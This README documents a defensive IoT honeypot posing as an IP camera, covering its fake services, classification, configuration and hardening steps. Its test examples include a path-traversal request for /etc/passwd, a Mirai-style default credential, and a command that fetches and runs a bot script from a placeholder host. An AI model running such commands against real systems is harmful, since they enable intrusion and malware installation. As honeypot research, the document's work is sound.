# Adaptive IoT Honeypot

A low-interaction honeypot that imitates an IP camera (`IoT-CAM-3000`). It
exposes fake HTTP, Telnet, raw shell and MQTT services, records everything
attackers do, classifies each action, and shows the results on a private
dashboard.

Nothing an attacker sends is ever executed, downloaded or written to disk as a
file. Commands run against an in-memory fake shell; "downloads" only create a
fake entry in that session's fake filesystem.

> **Deploy with care.** A honeypot invites hostile traffic. Run it on an
> isolated host or network segment (a throwaway VPS or a separate VLAN), never
> on a machine that holds anything you care about. See [Deployment](#deployment).

## What it does

| Decoy | Default port | Behaviour |
|---|---|---|
| Fake web admin panel | 8080 | Camera status page and login form. Captures form and Basic-auth credentials, logs every path, query string and user agent. |
| Fake Telnet | 2323 | Login prompt, then a stateful BusyBox-style shell. Handles Telnet option negotiation. |
| Fake raw shell | 2222 | Same shell without Telnet framing (works with `nc`). |
| Fake MQTT broker | 1883 | Parses MQTT 3.1 / 3.1.1 / 5.0 packets: client id, credentials, topics, payloads. |
| Dashboard + API | 5000 | For you only. Stats, filters, per-session drill-down, CSV / JSON export. |

**Adaptive shell.** Each connection has its own state. After
`cd /tmp; wget http://x/bot.sh`, the file appears in `ls`, can be `chmod`-ed,
"run" and removed, and the prompt follows `cd`. It answers the
`busybox <RANDOM>` probe that Mirai-family bots use to confirm a real shell.

**Classification.** Rules with word-boundary matching run first; an optional
scikit-learn model is consulted only when no rule matches and only if it is
confident. Labels: `malware_download_attempt`, `system_tampering`,
`exploit_attempt` (high risk); `credential_attack`, `reconnaissance`,
`web_admin_scan`, `mqtt_probe` (medium); `general_probe` (low).

**Sessions.** Every TCP connection gets a session id, so you can replay one
attacker's whole visit in order from the dashboard.

## Quick start (local)

Requires Python 3.11+.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python -m app.main
```

Everything binds to `127.0.0.1`. Open the dashboard at <http://127.0.0.1:5000>.

Try it:

```bash
# Web panel
curl -X POST http://127.0.0.1:8080/login -d "username=admin&password=admin123"
curl "http://127.0.0.1:8080/cgi-bin/..%2f..%2fetc/passwd"

# Shell (any username, any non-empty password)
nc 127.0.0.1 2222
#   root / xc3511, then:  cd /tmp; wget http://198.51.100.7/bot.sh; ls -l; ./bot.sh

# Telnet
telnet 127.0.0.1 2323

# MQTT CONNECT
printf '\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x02ab' | nc 127.0.0.1 1883
```

## Configuration

All settings are environment variables. Copy `.env.example` to `.env`;
`./run.sh` and Docker Compose both read it.

| Variable | Default | Purpose |
|---|---|---|
| `DASHBOARD_HOST` / `DASHBOARD_PORT` | `127.0.0.1` / `5000` | Where the dashboard listens |
| `DASHBOARD_USERNAME` / `DASHBOARD_PASSWORD` | `admin` / *(unset)* | HTTP Basic auth. Auth is on whenever a password is set |
| `FAKE_HTTP_HOST` / `FAKE_HTTP_PORT` | `127.0.0.1` / `8080` | Web decoy |
| `FAKE_SHELL_HOST` / `FAKE_SHELL_PORT` | `127.0.0.1` / `2222` | Raw shell decoy |
| `FAKE_TELNET_HOST` / `FAKE_TELNET_PORT` | `127.0.0.1` / `2323` | Telnet decoy |
| `FAKE_MQTT_HOST` / `FAKE_MQTT_PORT` | `127.0.0.1` / `1883` | MQTT decoy |
| `ENABLE_HTTP`, `ENABLE_SHELL`, `ENABLE_TELNET`, `ENABLE_MQTT` | `true` | Turn individual decoys off |
| `HONEYPOT_MAX_CONNECTIONS` | `200` | Concurrent TCP sessions, all decoys |
| `HONEYPOT_MAX_CONNECTIONS_PER_IP` | `10` | Concurrent sessions per source IP |
| `HONEYPOT_SESSION_TIMEOUT` / `HONEYPOT_IDLE_TIMEOUT` | `300` / `60` | Seconds before a session is cut |
| `HONEYPOT_MAX_LINE_BYTES` | `4096` | Longest accepted command line |
| `HONEYPOT_MAX_COMMANDS` | `500` | Commands per session |
| `HONEYPOT_MAX_RAW_INPUT` | `2000` | Characters stored per event |
| `HONEYPOT_MAX_EVENTS` | `500000` | Oldest events are pruned beyond this (`0` = unlimited) |
| `HONEYPOT_USE_ML` / `HONEYPOT_ML_MIN_CONFIDENCE` | `true` / `0.45` | ML tie-breaker |
| `HONEYPOT_DATA_DIR` / `HONEYPOT_LOG_DIR` | `./data` / `./logs` | SQLite database and rotating log |
| `HONEYPOT_LOG_LEVEL` | `INFO` | Log verbosity |

The honeypot **refuses to start** if the dashboard is bound to a non-loopback
address without `DASHBOARD_PASSWORD`.

## Deployment

### Docker (recommended)

```bash
cp .env.example .env        # set a long random DASHBOARD_PASSWORD
docker compose up -d --build
docker compose logs -f
```

The Compose file:

- runs as an unprivileged user with a read-only root filesystem, all Linux
  capabilities dropped, `no-new-privileges`, and CPU / memory / PID limits;
- maps host port `23` to the container's `2323`, so no root is needed inside;
- publishes the dashboard on `127.0.0.1:5000` only. To view it remotely, use an
  SSH tunnel: `ssh -L 5000:127.0.0.1:5000 user@host`;
- keeps the database and logs in the `honeypot-data` volume.

### Hardening checklist

- [ ] Dedicated host or VLAN with no route to your real network.
- [ ] Firewall the host's **outbound** traffic. The honeypot never needs to
      initiate connections.
- [ ] Dashboard reachable only via loopback / SSH tunnel / VPN. Basic auth is
      sent in clear text over plain HTTP, so do not expose port 5000 directly;
      put it behind a TLS reverse proxy if it must be remote.
- [ ] Strong, unique `DASHBOARD_PASSWORD`.
- [ ] Move the host's real SSH off port 22 / restrict it by source IP.
- [ ] Check your provider's terms: some forbid running honeypots.
- [ ] Captured data contains IP addresses and attempted credentials. Handle it
      according to the privacy rules that apply to you.

### Without Docker

Use `./run.sh` under a process supervisor (for example a systemd unit with
`User=` set to an unprivileged account). To receive traffic on port 23 without
root, redirect it:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
```

## Dashboard and API

| Endpoint | Description |
|---|---|
| `GET /` | Dashboard. Click a classification, service, IP or session to filter |
| `GET /api/events` | JSON events. `limit` (max 1000), `offset`, and filters `service`, `classification`, `risk_level`, `source_ip`, `session_id` |
| `GET /api/stats` | Totals and breakdowns |
| `GET /api/export?format=csv\|json` | Full streamed export |
| `GET /healthz` | Liveness probe (no auth, no data) |

```bash
curl -u admin:$DASHBOARD_PASSWORD "http://127.0.0.1:5000/api/events?risk_level=high&limit=20"
```

Attacker input is escaped in the dashboard, which loads no scripts and no
external resources and sends a `default-src 'none'` Content-Security-Policy.
CSV exports neutralise spreadsheet formula injection.

## Development

```bash
pip install -r requirements-dev.txt
pytest          # unit + integration tests against real sockets
ruff check .
```

CI (GitHub Actions) runs lint and tests on Python 3.11 to 3.13 and builds the
Docker image.

## Project structure

```text
app/
  main.py            entry point, startup checks, graceful shutdown
  config.py          environment-driven settings
  database.py        thread-safe SQLite store, migrations, pruning
  dashboard.py       operator dashboard and JSON API
  logging_setup.py   console + rotating file logs
services/
  tcp_base.py        connection limits, timeouts, line reader, Telnet handling
  shell_emulator.py  stateful fake BusyBox shell and filesystem
  fake_shell.py      login flow + shell session (raw TCP)
  fake_telnet.py     the same over Telnet
  fake_mqtt.py       MQTT packet parser and fake broker
  fake_http.py       fake camera web panel
analyzer/
  classifier.py      rule-based + optional ML classification
tests/
```

## Limitations

- Low-interaction: a determined human will recognise the fake shell quickly.
  It is built to study automated scanners and bots.
- The ML model is trained on a small built-in sample set. Treat its labels as
  hints; retrain on your own captured events for better results.
- SQLite suits a single node. For very high volumes, forward events elsewhere.
- No TLS on any service. Terminate TLS in a reverse proxy if required.

## Roadmap

- STIX / MISP threat-intelligence export
- Scheduled PDF or email reports
- SSH decoy (real SSH handshake)
- Retraining the classifier from captured events
- GeoIP and ASN enrichment
